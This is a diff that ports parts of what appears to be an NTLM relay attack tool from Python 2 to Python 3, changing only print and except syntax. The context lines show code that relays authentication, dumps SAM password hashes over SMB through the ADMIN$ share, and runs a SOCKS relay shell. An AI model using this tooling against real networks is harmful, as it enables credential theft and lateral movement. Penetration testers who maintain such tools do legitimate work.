@@ -32,6 +32,7 @@
 # programmatically.
 #
 
+from __future__ import print_function
 import argparse
 import sys
 import thread
@@ -104,7 +105,7 @@ class SMBAttack(Thread):
 
                 remoteOps  = RemoteOperations(self.__SMBConnection, False)
                 remoteOps.enableRegistry()
-            except Exception, e:
+            except Exception as e:
                 # Something went wrong, most probably we don't have access as admin. aborting
                 logging.error(str(e))
                 return
@@ -116,7 +117,7 @@ class SMBAttack(Thread):
                     self.__answerTMP = ''
                     self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                     self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
-                    print self.__answerTMP.decode(self.config.encoding, 'replace')
+                    print(self.__answerTMP.decode(self.config.encoding, 'replace'))
                 else:
                     bootKey = remoteOps.getBootKey()
                     remoteOps._RemoteOperations__serviceDeleted = True
@@ -125,7 +126,7 @@ class SMBAttack(Thread):
                     samHashes.dump()
                     samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
                     logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
-            except Exception, e:
+            except Exception as e:
                 logging.error(str(e))
             finally:
                 if samHashes is not None:
@@ -240,9 +241,9 @@ class HTTPAttack(Thread):
         #for example with:
         result = self.client.request("GET", "/")
         r1 = self.client.getresponse()
-        print r1.status, r1.reason
+        print(r1.status, r1.reason)
         data1 = r1.read()
-        print data1
+        print(data1)
 
         #Remove protocol from target name
         #safeTargetName = self.client.target.replace('http://','').replace('https://','')
@@ -358,19 +359,19 @@ class MiniShell(cmd.Cmd):
         outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])
 
         # Print header
-        print outputFormat.format(*header)
-        print '  '.join(['-' * itemLen for itemLen in colLen])
+        print(outputFormat.format(*header))
+        print('  '.join(['-' * itemLen for itemLen in colLen]))
 
         # And now the rows
         for row in items:
-            print outputFormat.format(*row)
+            print(outputFormat.format(*row))
 
     def emptyline(self):
         pass
 
     def do_targets(self, line):
         for url in self.relayConfig.target.originalTargets:
-            print url.geturl()
+            print(url.geturl())
         return
 
     def do_socks(self, line):
@@ -383,7 +384,7 @@ class MiniShell(cmd.Cmd):
             r = opener.open(response)
             result = r.read()
             items = json.loads(result)
-        except Exception, e:
+        except Exception as e:
             logging.error("ERROR: %s" % str(e))
         else:
             if len(items) > 0:
@@ -392,7 +393,7 @@ class MiniShell(cmd.Cmd):
                 logging.info('No Relays Available!')
 
     def do_exit(self, line):
-        print "Shutting down, please wait!"
+        print("Shutting down, please wait!")
         return True
 
 # Process command-line arguments.
@@ -404,7 +405,7 @@ if __name__ == '__main__':
 
     # Init the example's logger theme
     logger.init()
-    print version.BANNER
+    print(version.BANNER)
     #Parse arguments
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
                                     "try to relay that connection to specified target(s) system or the original client")
@@ -478,7 +479,7 @@ if __name__ == '__main__':
 
     try:
        options = parser.parse_args()
-    except Exception, e:
+    except Exception as e:
        logging.error(str(e))
        sys.exit(1)
 
@@ -567,7 +568,7 @@ if __name__ == '__main__':
         s.start()
         threads.add(s)
 
-    print ""
+    print("")
     logging.info("Servers started, waiting for connections")
     try:
         if options.socks:
